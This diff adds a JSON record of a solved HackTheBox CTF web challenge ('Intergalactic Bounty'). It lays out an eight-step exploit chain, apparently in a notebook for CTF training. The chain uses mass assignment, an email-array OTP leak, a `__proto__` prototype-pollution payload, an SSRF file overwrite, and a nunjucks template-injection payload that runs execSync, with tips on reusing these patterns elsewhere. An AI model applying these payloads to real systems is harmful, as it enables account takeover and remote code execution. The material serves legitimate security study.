@@ -1,0 +1,146 @@
+{
+  "schema_version": 1,
+  "id": "htb-intergalactic-bounty-recipient-array-differential-otp-mass-assign-needle-output-nunjucks-rce",
+  "source_note": "challenges/Intergalatic Bounty/web_intergalatic_bounty/challenge/controllers/bountyController.js",
+  "challenge": {
+    "name": "Intergalactic Bounty",
+    "platform": "HackTheBox",
+    "event": "HTB University CTF 2024",
+    "category": "web",
+    "solved_at": "2026-09-26",
+    "assistance": "writeup-assisted"
+  },
+  "stack": [
+    "node",
+    "express",
+    "sequelize",
+    "sqlite",
+    "nunjucks",
+    "nodemailer",
+    "mailhog",
+    "needle",
+    "sanitize-html",
+    "puppeteer",
+    "docker",
+    "supervisord"
+  ],
+  "preconditions": {
+    "all_of": [
+      "one endpoint validates a body field and a second endpoint consumes the same field with no validation at all",
+      "that unvalidated value is forwarded verbatim to two different consumers that each accept a different shape for it (an ORM where-clause and a mail transport)",
+      "a recursive merge (@christopy/mergedeep) copies the whole request body into an object, recursing through an own __proto__ key",
+      "a server-side HTTP client reads its options off a plain object literal, so every option is prototype-reachable",
+      "a template engine renders a file the HTTP client can be made to overwrite"
+    ],
+    "any_of": [
+      "the registration handler takes `role` straight from the body, so admin is a body field rather than a separate escalation",
+      "an admin bot visits attacker content and the mXSS in sanitize-html (math/style/svg + allowVulnerableTags) is used to steal the admin cookie instead"
+    ]
+  },
+  "signals": [
+    "mergedeep",
+    "allowVulnerableTags",
+    "parseOneAddress",
+    "resendVerificationCode",
+    "generateRandomCode",
+    "follow_max",
+    "interstellar.htb",
+    "test@email.htb",
+    "mailhog-auth",
+    "sendVerificationEmail",
+    "editBountiesAPI",
+    "transmitAPI",
+    "fetchURL",
+    "visitReport"
+  ],
+  "chain": [
+    {
+      "step": 1,
+      "stage": "recon",
+      "action": "read challenge/util.js, controllers/authController.js, models/userModel.js, routes.js and config/supervisord.conf before sending anything; note that Dockerfile EXPOSEs 1337 (app) and 8080 (a second express app that reads MailHog)",
+      "why": "the second exposed port is the OTP oracle: email-app/routes/index.js renders only messages whose envelope recipients contain the literal test@email.htb, so the whole first half of the chain is about getting a verification mail delivered to that address"
+    },
+    {
+      "step": 2,
+      "stage": "primitive",
+      "action": "POST /api/register with {\"email\":\"you@interstellar.htb\",\"password\":\"...\",\"role\":\"admin\"} — role is destructured straight out of req.body and passed to User.createUser",
+      "why": "mass assignment; the Sequelize ENUM('user','admin') accepts 'admin' and no handler ever re-checks it. Registration does NOT send the mail despite what its message says — only /api/sendEmail does"
+    },
+    {
+      "step": 3,
+      "stage": "primitive",
+      "action": "POST /api/sendEmail with {\"email\":[\"you@interstellar.htb\",\"test@email.htb\"]} and read the code off the mail app on the second port",
+      "why": "the domain allowlist lives only in registerAPI; resendVerificationAPI forwards the raw body value to BOTH Sequelize and nodemailer. Sequelize reads an array as `email IN (...)` so the row still matches, nodemailer reads the same array as a recipient list so the OTP is also delivered to the readable mailbox. One value, two consumers, two meanings"
+    },
+    {
+      "step": 4,
+      "stage": "primitive",
+      "action": "POST /api/verify then POST /api/login; the JWT payload carries role=admin, which unlocks PUT /api/bounties/:id and POST /api/transmit",
+      "why": "adminMiddleware only reads role off the token, and the token is minted from the row whose role was set in step 2"
+    },
+    {
+      "step": 5,
+      "stage": "primitive",
+      "action": "POST /api/bounties with the nunjucks payload in the `status` field",
+      "why": "addBountiesAPI destructures `status` OUT of the body before sanitizeHTMLContent runs, so status is the one field that is never sanitised; every other field goes through sanitize-html"
+    },
+    {
+      "step": 6,
+      "stage": "sink",
+      "action": "PUT /api/bounties/:id with {\"__proto__\":{\"output\":\"/app/views/transmit.html\",\"parse_response\":false,\"cookies\":{\"auth\":\"<jwt>\"}}}",
+      "why": "mergedeep recurses on the JSON-parsed own __proto__ key, so mergeDeep(Object.prototype, payload) writes all three onto Object.prototype. needle reads its options off the plain literal {compressed:true,follow_max:0} in util.js fetchURL, so every one of them is now inherited. `output` turns the SSRF into an arbitrary file write, `parse_response:false` is mandatory (see traps), `cookies` both authenticates needle's request and makes cookie-parser skip parsing for every later request"
+    },
+    {
+      "step": 7,
+      "stage": "sink",
+      "action": "POST /api/transmit with {\"url\":\"http://127.0.0.1:1337/api/bounties/<id>\"} to write that JSON response over a nunjucks view",
+      "why": "needle only writes the file when the response is 200, and the app's own JSON endpoint is the one 200 whose body the attacker controls, so no external callback host is needed on a NAT'd network"
+    },
+    {
+      "step": 8,
+      "stage": "impact",
+      "action": "GET /transmit — nunjucks compiles the JSON that was just written over views/transmit.html and evaluates the expression sitting in the status field: {{range.constructor('return global.process.mainModule.require(\"child_process\").execSync(\"cat /flag.txt\").toString()')()}}",
+      "why": "autoescape only escapes the OUTPUT of an expression, never the template source, so a template file written at runtime is straight RCE"
+    }
+  ],
+  "first_confirming_probe": {
+    "request": "POST /api/sendEmail with {\"email\":[\"<your registered address>@interstellar.htb\",\"test@email.htb\"]}, then GET the mail app on the second exposed port",
+    "expected": "HTTP 200 {\"message\":\"New verification code sent\"} and the verification code visible in the mailbox that only shows mail addressed to test@email.htb — proving the array was read as an IN-list by the ORM and as a recipient list by the mailer",
+    "falsifier": "the mailbox stays empty (nodemailer given a single recipient, or the lookup is a strict string equality that an array cannot satisfy), or /api/sendEmail answers 'User not found' (the ORM rejected the array instead of widening to IN)"
+  },
+  "blast_radius": "Step 6 writes onto Object.prototype for the lifetime of the process and step 7 OVERWRITES a template file on disk — views/transmit.html stops being the real page until the instance is restarted. Pick a view that has not been rendered yet in that process: nunjucks' FileSystemLoader caches compiled templates by name, so overwriting a view that was already served does nothing. The PUT itself is safe for the row: mergedeep adds no own key to the target, so data.update() is a no-op update (it still answers 500, see traps). Anything that crashes the node process is expensive here because database.js runs sequelize.sync({force:true}) on boot: every account, bounty and the JWT signing secret are destroyed and the whole setup has to be redone.",
+  "verification": {
+    "status": "verified_live",
+    "evidence": "Live HTB instance. GET /transmit returned HTTP 200 rendering the bounty JSON that needle had written over views/transmit.html, with the `status` field replaced by the output of `cat /flag.txt`. Recorded in challenges/galactic-bounty/state.json through tools/hooks.py post-probe (verdict confirms, evidence-kind impact) and pre-flag (source live-response)."
+  },
+  "reuse_when": [
+    "a validation (domain allowlist, format check, ownership check) is applied on one endpoint and a second endpoint consumes the same field with none",
+    "one request value is forwarded to two consumers that accept different shapes for it — an ORM where-clause takes an array as IN, a mail/HTTP client takes the same array as a list",
+    "a handler destructures a field out of the body before the sanitiser runs and then puts it back afterwards",
+    "a recursive merge copies the request body into an object and only ever checks `if (!target[key])`",
+    "a server-side HTTP client is called with an object-literal options bag — every option it reads is then prototype-reachable, including ones that write files",
+    "a template engine renders from disk and any primitive can write to its view directory"
+  ],
+  "known_traps": [
+    "needle's `output` alone CRASHES the app when the fetched response is JSON. With parse_response at its default 'all', needle emits a parsed object and then does file.write(chunk) on it: ERR_INVALID_ARG_TYPE escapes as an unhandled rejection because transmitAPI has no try/catch, node exits, supervisord restarts it and sequelize.sync({force:true}) wipes the database. Pollute parse_response:false in the same request. Reproduced offline against needle 3.3.1 before it was fired again.",
+    "the PUT always answers 500 {\"message\":\"Error fetching data\"} — that is data.update() failing AFTER mergedeep has already run. The pollution has landed; do not read the 500 as a failed probe. Confirm it out of band with an unauthenticated request (once `cookies` is polluted, cookie-parser returns early because req.cookies is inherited, and every request authenticates as the polluted token).",
+    "the puppeteer branch is a measured dead end on modern node. Object.prototype.debuggingPort DOES reach chromium's argv (computeLaunchArguments destructures it off the options object, and @puppeteer/browsers spawns with a plain {detached,env,stdio} literal), but node 20.18.3 ignores a prototype-inherited `shell` — an own shell:true shells out, the inherited one does not — so the argv injection never reaches /bin/sh. BrowserLauncher also existsSync()s executablePath, which kills the 'executablePath = command #' variant.",
+    "nunjucks caches compiled templates per loader, so overwriting a view that has already been rendered in this process is silently a no-op. views/index.html is the obvious target and the wrong one if anything has fetched / — use a view no request has reached yet.",
+    "JSON.stringify escapes the double quotes inside the payload, so the template on disk reads require(\\\"child_process\\\"). nunjucks' lexer unescapes it, but only if the OUTER quotes are single — write {{range.constructor('...\\\"...\\\"...')()}}, never the reverse.",
+    "MailHog persists across an app restart (separate supervisord program, maildir storage), so after a crash the mailbox still holds the previous code. Hit /deleteall on the mail app before re-reading, or take the last match, or you will verify with a stale OTP.",
+    "registerAPI's response says 'Verification email sent' but User.createUser never sends one. Only /api/sendEmail does. Waiting for the mail that the registration response promised wastes the first probe.",
+    "the email-parser polyglot that public writeups use ('\"test@email.htb ...\"@interstellar.htb') is a different opener for the same step. A differential sweep of email-addresses 5.0.0 against nodemailer 6.9.16 over 25 candidate strings found no single-address form that parses as domain interstellar.htb while producing envelope recipient test@email.htb — the array shape goes through /api/sendEmail instead, which skips the domain check entirely.",
+    "provenance: the chain was derived from the pinned package sources (needle's `output`, puppeteer's debuggingPort/shell) before any search; a writeup search was then used once, to choose between those two candidate final hops rather than spend probes on both, and the puppeteer branch was measured dead locally afterwards. Card is filed writeup-assisted for that reason."
+  ],
+  "flag": null,
+  "classification": {
+    "primary": "web-parser-differential",
+    "secondary": [
+      "web-prototype-pollution",
+      "web-ssti",
+      "web-logic-flaw",
+      "web-auth-session"
+    ],
+    "confidence": 0.85
+  }
+}
